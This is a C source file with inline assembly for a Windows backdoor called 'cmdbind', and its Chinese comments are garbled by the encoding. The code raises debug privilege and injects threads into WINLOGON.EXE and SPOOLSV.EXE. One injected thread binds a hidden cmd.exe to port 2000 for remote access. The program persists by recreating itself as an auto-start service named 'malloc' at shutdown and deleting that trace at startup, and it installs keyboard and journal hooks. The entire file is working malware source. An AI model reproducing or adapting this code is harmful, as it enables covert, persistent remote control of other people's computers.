/*
cmdbind����Զ���̺߳͹ܵ���WINLOGON.EXE��SPOOLSV.EXE�н���
Զ���̰߳�cmd.exe�󶨵�2000�˿ڣ����������ӵõ�power������
�£���CTRL_SHUTDOWN_EVENT����Ϣ����������ļ�������nt����
�ڱ�����ʱɾ�������ļ�����Ӧ��nt����
*/
#include "cmdbind.h"
DWORD AddrGetTr()
{

	DWORD n_addr;
	_asm
	{
		call to
		and  eax,0xfffff000
		mov ecx,[eax]
		mov n_addr,ecx
	}

	return n_addr;
to:
	_asm
	{
		pop eax
		push eax
		ret
	}
	
}
//���̹��Ӻ���
LRESULT CALLBACK KeyboardProc (int code, WPARAM wParam, LPARAM lParam)
{

	DWORD b_addr;
	RT *b = 0;
	b_addr=AddrGetTr();
	_asm
	{
		mov eax,b_addr
		mov b,eax
	}

	if(code<0) return b->fnCallNextHookEx(b->g_hLogHook,code,wParam,lParam);
	
	if(code==HC_ACTION)
	{
		if(wParam==0xFF)
		{
				rw_reg(0,b );
		//		b->fnMessageBeep(0);
				b->fnUnhookWindowsHookEx(b->g_hLogHook);

		}
	
	}
				
	return b->fnCallNextHookEx(b->g_hLogHook,code,wParam,lParam);

}
//WH_JOURNALPLAYBACK ���Ӻ���
LRESULT CALLBACK JournalLogProc(int code, WPARAM wParam, LPARAM lParam)
{

	DWORD b_addr;
	RT *b = 0;
	b_addr=AddrGetTr();
	_asm
	{
		mov eax,b_addr
		mov b,eax
	}

	if(code<0) return b->fnCallNextHookEx(b->g_hLogHook,code,wParam,lParam);

	if(code==HC_ACTION)
	{

		EVENTMSG *pEvt=(EVENTMSG *)lParam;

		if(pEvt->message==WM_KEYDOWN&&LOBYTE(pEvt->paramL)==0xFF)
		{
		rw_reg(0,b );
//		b->fnMessageBeep(0);
		b->fnUnhookWindowsHookEx(b->g_hLogHook);
		}

	}
			
	 return b->fnCallNextHookEx(b->g_hLogHook,code,wParam,lParam);

}
//ȡ�ý���identifier
DWORD GetLsassPid(UNICODE_STRING lsass )
{
    HINSTANCE hNtDll;
    NTSTATUS rc;
    ULONG ulNeed = 0;
    void *buf = NULL;
    size_t len = 0;
    int ret = 0;

    hNtDll = LoadLibrary( "NTDLL" );
    if( !hNtDll )
        return 0;

    NtQuerySystemInformation = (NtQSI_t)GetProcAddress( hNtDll, "NtQuerySystemInformation" );
    if (!NtQuerySystemInformation)
        return 0;

    RtlCompareUnicodeString = (RtlCUS_t)GetProcAddress( hNtDll, "RtlCompareUnicodeString" );
    if( !RtlCompareUnicodeString )
        return 0;

    do 
    {
        delete[] buf;
        len += 2000;
        buf = new BYTE[len];
        if( !buf )
            return 0;
        rc = NtQuerySystemInformation( 5, buf, len, &ulNeed );
    } while( rc == 0xc0000004 );
    if( rc <0 ) 
    {
        delete[] buf;
        return 0;
    }

    {
        struct process_info *p = (struct process_info*)buf;
        bool endlist = false;
        while( !endlist ) 
        {
            if( p->ProcessName.Buffer && !RtlCompareUnicodeString( &lsass, &p->ProcessName, 1 ) ) 
            {
                ret = p->ProcessId;
                goto exit;
            }
            endlist = p->NextEntryDelta == 0;
            p = (struct process_info *)(((BYTE*)p) + p->NextEntryDelta);
        }
    }

 exit:
    delete[] buf;
    FreeLibrary( hNtDll );

    return ret;
}
//�������˿�
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
		::ZeroMemory( &MCopy, sizeof(MCopy) );
		SERVICE_TABLE_ENTRY Dsv[2];
		Dsv[0].lpServiceName="malloc";
		Dsv[0].lpServiceProc=ServiceMain;
		Dsv[1].lpServiceName=NULL;
		Dsv[1].lpServiceProc=NULL;
		StartServiceCtrlDispatcher(Dsv);
		Temp();
		return 0;
}
//�ı�����
void EnableDebugPriv( void )
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;

	if ( ! OpenProcessToken( GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )

		return;
	

	if ( ! LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &sedebugnameValue ) )
	{
		CloseHandle( hToken );
		return;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if ( ! AdjustTokenPrivileges( hToken, FALSE, &tkp, sizeof tkp, NULL, NULL ) )
		
	CloseHandle( hToken );
}
//дĿ���ڴ�
bool Bugger( HANDLE h)
{
	HANDLE ht = 0;
	void *p = 0,*d=0;
	RT *c = 0;
	bool result = false;
	DWORD rc;
	HINSTANCE hk32 = 0;

//�Ѻ���д��Ŀ���ڴ�

	p = VirtualAllocEx( h, 0, MAXINJECTSIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
	if ( p == 0 )
		goto cleanup;
//Ϊ��������ռ�
	c = (RT*) VirtualAllocEx( h, 0, sizeof(RT), MEM_COMMIT, PAGE_READWRITE );
	if ( c == 0 )
		goto cleanup;
//Ϊ������������ռ�
	d = VirtualAllocEx( h, 0, MCopy.dwLen, MEM_COMMIT, PAGE_READWRITE );
	if ( c == 0 )
		goto cleanup;

	VirtualProtectEx(h,d,MCopy.dwLen,PAGE_EXECUTE_READWRITE,0);
	if ( ! WriteProcessMemory( h, d,f_Maddr,MCopy.dwLen, 0 ) )
		goto cleanup;
	MCopy.FileAddr=(unsigned long)d;
	_asm
	{
		mov eax,c
		mov MCopy.N_addr,eax
	}

	VirtualProtectEx(h,p,MAXINJECTSIZE,PAGE_EXECUTE_READWRITE,0);
	if ( ! WriteProcessMemory( h, p, &c, 4, 0 ) )
		goto cleanup;

	_asm
	{
	mov eax,p
	add eax,0x4
	mov p,eax
	}

	if ( ! WriteProcessMemory( h, p, &HookTh, MAXINJECTSIZE-4, 0 ) )
		goto cleanup;

	_asm
	{
		mov eax,p
		mov MCopy.b_addr,eax
	}

	MCopy.N_logon=Ilogon;

//�Ѳ���д��Ŀ���ڴ�
	VirtualProtectEx(h,c,sizeof MCopy,PAGE_EXECUTE_READWRITE,0);
	if ( ! WriteProcessMemory( h, c, &MCopy, sizeof MCopy, 0 ) )
		goto cleanup;

// ����bindԶ���߳�
		_asm
	{
		mov eax,p
		add eax,0x5
		mov p,eax

	}
	ht = CreateRemoteThread( h, 0, 0, (DWORD (__stdcall *)( void *)) p, c, 0, &rc );
	if ( ht == NULL )
		goto cleanup;

// ����shutdownԶ���߳�
	_asm
	{
		mov eax,p
		add eax,0xF
		mov p,eax

	}

	ht = CreateRemoteThread( h, 0, 0, (DWORD (__stdcall *)( void *)) p, c, 0, &rc );
	if ( ht == NULL )
		goto cleanup;


	return 0;

cleanup:
	if ( p != 0 )
		VirtualFreeEx( h, p, 0, MEM_RELEASE );
	if ( c != 0 )
		VirtualFreeEx( h, c, 0, MEM_RELEASE );
	if ( hk32 != 0 )
		FreeLibrary( hk32 );

	return result;
}

DWORD __stdcall MRemoteThreadBind( RT *b )
{
	HINSTANCE				Dllkernel32,Dlluser32,Dllwsock32;
	MWSAStartup				myWSAStartup;
	WSADATA					WSAData;
	int						listenFD;
	int						clientFD;
	int						ret;
	struct sockaddr_in		server;

	SECURITY_ATTRIBUTES		sa;
	HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2;
	STARTUPINFO si;
	PROCESS_INFORMATION		ProcessInformation;
	unsigned long			lBytesRead;

	typedef int (__stdcall *Msocket)(int,int,int);
	Msocket		myMsocket;
	typedef int (__stdcall *Mbind)(int,const struct sockaddr FAR* ,int);
	Mbind		myMbind;
	typedef u_short (__stdcall *Mhtons)(u_short);
	Mhtons		myMhtons;
	typedef int (__stdcall *Mlisten)(int,int);
	Mlisten		myMlisten;
	typedef int (__stdcall *Maccept)(int,struct sockaddr FAR* ,int FAR* );
	Maccept		myMaccept;
	typedef bool (__stdcall *Mclosesocket)(int);
	Mclosesocket		myMclosesocket;
	typedef int (__stdcall *Msend)(int,const char FAR *,int,int);
	Msend		myMsend;
	typedef int (__stdcall *Mrecv)(int,const char FAR *,int,int);
	Mrecv		myMrecv;

//����dll
	Dllwsock32=b->fnLoadLibrary(b->Sname);
	if(Dllwsock32==NULL)
		return 0;
	Dllkernel32=b->fnLoadLibrary(b->Kname);
	if(Dllwsock32==NULL)
		return 0;
	Dlluser32=b->fnLoadLibrary(b->Uname);
	if(Dlluser32==NULL)
		return 0;

//ȡ�ü��غ�����ַ
	myWSAStartup = (MWSAStartup)b->fnGetProcAddress(Dllwsock32, b->MWSAStart);
	if(myWSAStartup==NULL)
		return 0;

    myWSAStartup((WORD)((1<<8)|1),(LPWSADATA) &WSAData);

	myMsocket = (Msocket)b->fnGetProcAddress(Dllwsock32, b->sockM);
	if(myMsocket==NULL)
		return 0;

	myMbind = (Mbind)b->fnGetProcAddress(Dllwsock32, b->bindM);
	if(myMbind==NULL)
		return 0;

	myMhtons = (Mhtons)b->fnGetProcAddress(Dllwsock32, b->htonsM);
	if(myMhtons==NULL)
		return 0;

	myMlisten = (Mlisten)b->fnGetProcAddress(Dllwsock32, b->listenM);
	if(myMlisten==NULL)
		return 0;

	myMaccept = (Maccept)b->fnGetProcAddress(Dllwsock32, b->acceptM);
	if(myMaccept==NULL)
		return 0;

	myMclosesocket = (Mclosesocket)b->fnGetProcAddress(Dllwsock32, b->closesocketM);
	if(myMclosesocket==NULL)
		return 0;

	myMsend = (Msend)b->fnGetProcAddress(Dllwsock32, b->sendM);
	if(myMsend==NULL)
		return 0;

	myMrecv = (Mrecv)b->fnGetProcAddress(Dllwsock32, b->recvM);
	if(myMrecv==NULL)
		return 0;


	int iAddrSize = sizeof(server);

	sa.nLength=12;sa.lpSecurityDescriptor=0;sa.bInheritHandle=true;
//�����׽���
to:

	b->fnSleep(100);

	clientFD=myMsocket(AF_INET,SOCK_STREAM,0);
	listenFD=myMsocket(AF_INET,SOCK_STREAM,0);

	if(listenFD==INVALID_SOCKET)
					return 0;
	server.sin_family = AF_INET;
	server.sin_port = myMhtons((unsigned short)(2000));//���Ӷ˿�
	server.sin_addr.s_addr=INADDR_ANY;
	if (myMbind(listenFD, (SOCKADDR *) &server,b->namelen)!=0)
		 return 0;

	if (myMlisten(listenFD, 5))
		return 0;

	clientFD=myMaccept(listenFD,(sockaddr *)&server,&iAddrSize);
	if(clientFD==INVALID_SOCKET)
		return 0;

	ret=b->fnCreatePipe(&hReadPipe1,&hWritePipe1,&sa,0);
	if(ret==0)
		return 0;
	ret=b->fnCreatePipe(&hReadPipe2,&hWritePipe2,&sa,0);
	if(ret==0)
		return 0;
	ZeroMemory(&si,sizeof(si));
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = hReadPipe2;
	si.hStdOutput = si.hStdError = hWritePipe1;

	ret=b->fnCreateProcess(NULL,b->cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
	if(ret==0)
		return 0;
//����д��ܵ�����
	while(1) {
	memset(b->Buff,0,4096);
	b->fnSleep(350);
	ret=b->fnPeekNamedPipe(hReadPipe1,b->Buff,4096,&lBytesRead,0,0);
	if(lBytesRead) {

	ret=b->fnReadFile(hReadPipe1,b->Buff,lBytesRead,&lBytesRead,0);
	if(!ret) goto end;
	ret=myMsend(clientFD,b->Buff,lBytesRead,0);
	if(ret<=0) goto end;
	}else {
	memset(b->Buff,0,4096);
	lBytesRead=myMrecv(clientFD,b->Buff,4096,0);

	if(lBytesRead==SOCKET_ERROR||lBytesRead==0){

		ret=b->fnWriteFile(hWritePipe2,b->memcmpM,20,&lBytesRead,0);
		goto end;}
	if(memcmp(b->Buff,b->memcmpM,4)==0){
			ret=b->fnWriteFile(hWritePipe2,b->Buff,5,&lBytesRead,0);
			goto end;}
	ret=b->fnWriteFile(hWritePipe2,b->Buff,lBytesRead,&lBytesRead,0);

	if(!ret) goto end;
	}
	}
end:
	b->fnSleep(100);
	b->fnCloseHandle(hWritePipe2);
	b->fnCloseHandle(hReadPipe1);
	b->fnCloseHandle(hReadPipe2);
	b->fnCloseHandle(hWritePipe1);
	myMclosesocket(listenFD);
	myMclosesocket(clientFD);
	b->fnSleep(1000);
	goto to;
	return 0;
}
DWORD MRemoteThreadShut( RT* b )
{

    MSG         msg ;
 
	BOOL fSuccess;
	int i;
	WNDPROC OldWndProc,Nkeylo,NHookTh;
	DWORD thre,BADDR=b->b_addr;
	DWORD ThreadId;

	if(rw_reg(1,b )==0)
		return 0;

//����dll kernel32 user32

	b->fnLoadLibrary(b->Kname);

	b->fnLoadLibrary(b->Uname);



if(b->N_logon==0)
{

	_asm
	{
		mov eax,BADDR
		add eax,0x55
		mov Nkeylo,eax
	}

	for (i=0;i<4096;i++)
	{
		_asm
		{
			mov eax,i
			mov thre,eax
		}

	b->g_hLogHook=b->fnSetWindowsHookEx(WH_KEYBOARD ,(HOOKPROC)Nkeylo,0,thre);

}

	while (b->fnGetMessage (&msg, NULL, 0, 0))
          b->fnDispatchMessage (&msg) ;
    
}
///////////////////////////////////////
else

{
	//	if(b->N_logon==1)
	//	b->fnMessageBeep(0);


	_asm
	{
		mov eax,BADDR
		add eax,0x64
		mov OldWndProc,eax
	}

	fSuccess = b->fnSetConsoleCtrlHandler( 
    (PHANDLER_ROUTINE)OldWndProc,  
    TRUE);                           
	if (! fSuccess) 
	
		return 0;
	
	_asm
	{
		mov eax,BADDR
		mov NHookTh,eax
	}

	b->HandTh=b->fnCreateThread(NULL,0,
				     (LPTHREAD_START_ROUTINE)NHookTh,
						 NULL,0 ,&ThreadId);
	
}

    return msg.wParam;


}

BOOL CtrlHandler(DWORD fdwCtrlType)
{
	DWORD b_addr;
	RT *b = 0;

	b_addr=AddrGetTr();
	_asm
	{
		mov eax,b_addr
		mov b,eax
	}
	DWORD BADDR=b->b_addr;

    switch (fdwCtrlType)
	{ 
	

        case CTRL_SHUTDOWN_EVENT:
			rw_reg(0,b );
			return TRUE;
        default: 
 
            return FALSE; 
    } 
}

BOOL rw_reg(int op,RT *b )
{
	HANDLE c_file;
	DWORD dwBytes;

	if(op==0)//�ڹػ�ǰ
	{
	//	b->fnMessageBox(0,b->m_mlloc,0,0);
		SC_HANDLE scm=b->fnOpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
		if(scm==0)
			return 0;
		SC_HANDLE svc=b->fnCreateService(scm,
					b->m_mlloc,
					b->m_mlloc,
					DELETE,
					SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
					SERVICE_AUTO_START,
					SERVICE_ERROR_IGNORE,
					b->G_comlin,
					NULL,
					NULL,
					NULL,
					NULL,
					NULL);

	 	c_file=b->fnCreateFile(b->G_comlin,GENERIC_READ|GENERIC_WRITE,

		0,NULL,OPEN_ALWAYS 
		,FILE_ATTRIBUTE_NORMAL,NULL);

		if(c_file==INVALID_HANDLE_VALUE)
		return 0;
		char *buffer;
		buffer=(char *)b->FileAddr;
		b->fnWriteFile(c_file,buffer,b->dwLen,&dwBytes,0);
	//	b->fnMessageBox(0,buffer,0,0);
		b->fnCloseHandle(c_file);
		b->fnCloseServiceHandle(svc);
		b->fnCloseServiceHandle(scm);
	
                
}
else//�ڽ���
{
	b->fnLoadLibrary(b->Mname);

	SC_HANDLE Rscm=b->fnOpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);

	SC_HANDLE Rsvc=b->fnOpenService( Rscm,b->m_mlloc,DELETE );

	b->fnDeleteService(Rsvc);

	b->fnCloseServiceHandle(Rsvc);

	b->fnCloseServiceHandle(Rscm);

	if(b->N_logon!=0){
	b->fnSleep(2000);
	b->fnDeleteFile(b->G_comlin);
	}
	}


	return 1;
}

void HookTh()
{

	DWORD b_addr;
	HWND	Nhwnd,Ohwnd;
	HMODULE g_module=NULL;
	WNDPROC NJournalLogProc;
	MSG msg;
	BOOL g_bLogging=FALSE;
	RT *b = 0;
	
		
	b_addr=AddrGetTr();
	_asm
	{
		mov eax,b_addr
		mov b,eax

	}
// b->fnMessageBeep(0);
// b->fnMessageBox(0,0,0,0x00200000L);

	DWORD BADDR=b->b_addr;
	Nhwnd=Ohwnd=0;
//ȷ���Ƿ���log on
	if(b->ServeStart!=5)
	{
to:
		Ohwnd=Nhwnd;
		Nhwnd=b->fnGetTopWindow(0);
		if(Ohwnd!=Nhwnd&&Ohwnd!=0&&Nhwnd!=0)
		{
			b->fnSleep(30000);
			goto isbeg;
		}
//		b->fnMessageBeep(0);
		b->fnSleep(1000);
		goto to;	
	}
isbeg:

	g_module=b->fnGetModuleHandle(NULL);
	if(g_module==NULL)
			return ;
	
		_asm
		{
			mov eax,BADDR
			add eax,0x6E
			mov NJournalLogProc,eax
		}

	b->g_hLogHook=b->fnSetWindowsHookEx(WH_JOURNALRECORD ,(HOOKPROC)NJournalLogProc,g_module,0);
		if(b->g_hLogHook==NULL)
			return ;

   while (b->fnGetMessage(&msg, NULL, 0, 0))
   {	
	   if(msg.message==WM_CANCELJOURNAL)
	  
		b->g_hLogHook=b->fnSetWindowsHookEx(WH_JOURNALRECORD ,(HOOKPROC)NJournalLogProc,g_module,0);
	   
		b->fnDispatchMessage(&msg);
	
	}

	b->fnUnhookWindowsHookEx(b->g_hLogHook);
}

VOID WINAPI Handler( DWORD fControl ) 
{
	
}
VOID WINAPI ServiceMain( DWORD dwArgc, LPTSTR *lpszArgv )
 
{

	SERVICE_STATUS_HANDLE ssh=RegisterServiceCtrlHandler("malloc", &Handler);
	

	SERVICE_STATUS ss;
	ss.dwServiceType=SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS;
	ss.dwCurrentState=SERVICE_RUNNING;
	ss.dwControlsAccepted=0;
	ss.dwWin32ExitCode=NO_ERROR;
	ss.dwCheckPoint=0;
	ss.dwWaitHint=0;
	SetServiceStatus(ssh,&ss);
	ss.dwServiceType=SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS;
	ss.dwCurrentState=SERVICE_STOPPED;
	ss.dwControlsAccepted=0;
	ss.dwWin32ExitCode=NO_ERROR;
	ss.dwCheckPoint=0;
	ss.dwWaitHint=0;
	SetServiceStatus(ssh,&ss);
	Temp();
	
}
void Temp()
{

	DWORD pid = 0;
	HANDLE h;
	HINSTANCE hKernel32 ,hadvapi32,huser32,hmsvcrt;
	EnableDebugPriv();
    UNICODE_STRING WINLOGON = { 24, 20, L"WINLOGON.EXE" };
	pid=GetLsassPid(WINLOGON);
	if(pid==0)
		return ;
////////////////////////////////////////////////////////////////////

	char *comlin;
	char *pdest;
    int result;
	comlin=GetCommandLine();
	int ch='"';

    pdest = strrchr( comlin, ch );
	
    result = pdest - comlin + 1;
	if(pdest !=0)
	{
	strncpy(MCopy.G_comlin,comlin+1,result-2);
	MCopy.ServeStart=5;
	}
	else
	{
	strcat(MCopy.G_comlin,comlin);
	MCopy.ServeStart=1;
	}
	hKernel32 = LoadLibrary( "kernel32.dll" );
	huser32 = LoadLibrary( "user32.dll" );
	hadvapi32=LoadLibrary("advapi32.dll");
	hmsvcrt=LoadLibrary("msvcrt.dll");
	MCopy.fnLoadLibrary = (PLoadLibraryW)GetProcAddress (hKernel32, "LoadLibraryA"); 
	MCopy.fnGetProcAddress = (PGetProcAddress)GetProcAddress (hKernel32, "GetProcAddress");
	MCopy.fnFreeLibrary = (PFreeLibFunc)GetProcAddress( hKernel32, "FreeLibrary" );
	MCopy.fnGetModuleHandle = (PGetModuleHandle)GetProcAddress( hKernel32, "GetModuleHandleA" );
	MCopy.fnCallNextHookEx=(PCallNextHookEx)GetProcAddress( huser32, "CallNextHookEx" );
	MCopy.fnDefWindowProc=(PDefWindowProc)GetProcAddress( huser32, "DefWindowProcA" );
	MCopy.fnCreateFile=(PCreateFile)GetProcAddress( hKernel32, "CreateFileA" );
	MCopy.fnRegOpenKeyEx=(PRegOpenKeyEx)GetProcAddress( hadvapi32, "RegOpenKeyExA" );
	MCopy.fnRegCreateKey=(PRegCreateKey)GetProcAddress( hadvapi32, "RegCreateKeyA" );
	MCopy.fnReadFile=(PWriteFile)GetProcAddress( hKernel32, "ReadFile" );
	MCopy.fnRegSetValueEx=(PRegSetValueEx)GetProcAddress( hadvapi32, "RegSetValueExA" );
	MCopy.fnRegCloseKey=(PRegCloseKey)GetProcAddress( hadvapi32, "RegCloseKey" );
	MCopy.fnRegDeleteValue=(PRegDeleteValue)GetProcAddress( hadvapi32, "RegDeleteValueA" );
	MCopy.fnCloseHandle=(PCloseHandle)GetProcAddress( hKernel32, "CloseHandle" );
	MCopy.fnDeleteFile=(PDeleteFile)GetProcAddress( hKernel32, "DeleteFileA" );
	MCopy.fnmalloc=(Pmalloc)GetProcAddress( hmsvcrt, "malloc" );
	MCopy.fnMessageBox=(PMessageBox)GetProcAddress( huser32, "MessageBoxA" );
	MCopy.fnUnhookWindowsHookEx=(PUnhookWindowsHookEx)GetProcAddress( huser32, "UnhookWindowsHookEx" );
	MCopy.fnGetFileSize=(PGetFileSize)GetProcAddress( hKernel32, "GetFileSize" );
	MCopy.fnWriteFile=(PWriteFile)GetProcAddress( hKernel32, "WriteFile" );
	MCopy.fnSleep=(PSleep)GetProcAddress( hKernel32, "Sleep" );
	MCopy.fnSetWindowLong= (PSetWindowLong)GetProcAddress(huser32, "SetWindowLongA");
	MCopy.fnCreateWindow= (PCreateWindow)GetProcAddress(huser32, "CreateWindowExA");
	MCopy.fnGetMessage= (PGetMessage)GetProcAddress(huser32, "GetMessageA");
	MCopy.fnDispatchMessage= (PDispatchMessage)GetProcAddress(huser32, "DispatchMessageA");
	MCopy.fnSetWindowsHookEx= (PSetWindowsHookEx)GetProcAddress(huser32, "SetWindowsHookExA");
	MCopy.fnMessageBeep= (PMessageBeep)GetProcAddress(huser32, "MessageBeep");
	MCopy.fnSetConsoleCtrlHandler=(PSetConsoleCtrlHandler)GetProcAddress(hKernel32, "SetConsoleCtrlHandler");
	MCopy.fnCreateProcess=(PCreateProcess)GetProcAddress(hKernel32, "CreateProcessA");
	MCopy.fnPeekNamedPipe=(PPeekNamedPipe)GetProcAddress(hKernel32, "PeekNamedPipe");
	MCopy.fnCreatePipe=(PCreatePipe)GetProcAddress(hKernel32, "CreatePipe");
	MCopy.fnTerminateProcess=(PTerminateProcess)GetProcAddress(hKernel32, "TerminateProcess");
	MCopy.fnGetTopWindow= (PGetTopWindow)GetProcAddress(huser32, "GetTopWindow");
	MCopy.fnOpenSCManager=(POpenSCManager)GetProcAddress(hadvapi32, "OpenSCManagerA");
	MCopy.fnCreateService=(PCreateService)GetProcAddress(hadvapi32, "CreateServiceA");
	MCopy.fnCloseServiceHandle=(PCloseServiceHandle)GetProcAddress(hadvapi32, "CloseServiceHandle");
	MCopy.fnOpenService=(POpenService)GetProcAddress(hadvapi32, "OpenServiceA");
	MCopy.fnDeleteService=(PDeleteService)GetProcAddress(hadvapi32, "DeleteService");
	MCopy.fnCreateThread=(PCreateThread)GetProcAddress(hKernel32, "CreateThread");
	MCopy.fnTerminateThread=(PTerminateThread)GetProcAddress(hKernel32, "TerminateThread");
	MCopy.fnPeekMessage= (PPeekMessage)GetProcAddress(huser32, "PeekMessageA");
//	if(MCopy.fnPeekMessage==NULL){
//	MessageBox(NULL,NULL,NULL,MB_OK);
//	exit(0);
//	}
	char enter[]={0x0d};
	MCopy.G_comlen=lstrlen(MCopy.G_comlin);
	strcat(MCopy.Kname,"kernel32.dll");
	strcat(MCopy.Mname,"msvcrt.dll");
	strcat(MCopy.Uname,"user32.dll");
	strcat(MCopy.Sname,"wsock32.dll");
	strcat(MCopy.MWSAStart,"WSAStartup");
	strcat(MCopy.sockM,"socket");
	strcat(MCopy.bindM,"bind");
	strcat(MCopy.htonsM,"htons");
	strcat(MCopy.listenM,"listen");
	strcat(MCopy.acceptM,"accept");
	strcat(MCopy.closesocketM,"closesocket");
	strcat(MCopy.cmdLine,"cmd.exe");
	strcat(MCopy.sendM,"send");
	strcat(MCopy.recvM,"recv");
	strcat(MCopy.memcmpM,"exit\n");
	strcat(MCopy.memcmpM,enter);
	strcat(MCopy.m_mlloc,"malloc");
	MCopy.namelen=sizeof(SOCKADDR_IN);
	CopyFile(MCopy.G_comlin,Tfile,0);
		
	c_file=CreateFile(Tfile, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
	if(c_file==INVALID_HANDLE_VALUE)
		return ;

	MCopy.dwLen=GetFileSize(c_file,NULL);

	f_Map=CreateFileMapping(c_file, 0,PAGE_READWRITE,0,MCopy.dwLen+10,0 );
		if(f_Map==NULL)
		{
		//	MessageBox(0,"CreateFileMapping",0,0);
			CloseHandle(c_file);
			return ;
		}

	f_Maddr=MapViewOfFile(f_Map,FILE_MAP_WRITE,0,0,0 );
          	if(f_Maddr==NULL)

			{
				CloseHandle(f_Map);
				CloseHandle(c_file);
				return ;
			}




///////////////////////////////////////////////////////////////////		
		Ilogon=0;
		h = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );
		if ( h != 0 )
				 Bugger( h);
			
		CloseHandle( h );

		UNICODE_STRING SPOOLSV = { 22, 20, L"SPOOLSV.EXE" };
		pid=GetLsassPid( SPOOLSV);
			if(pid==0)
				goto to;
		h = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );

		Ilogon=1;
		if ( h != 0 )
				 Bugger( h);


to:
		UnmapViewOfFile(f_Maddr);
		CloseHandle(f_Map);
		CloseHandle(c_file);
		CloseHandle( h );
		DeleteFile(Tfile);
		FreeLibrary(hKernel32);
		FreeLibrary(huser32);
		FreeLibrary(hadvapi32);
		FreeLibrary(hmsvcrt);
		ExitProcess(0);
}
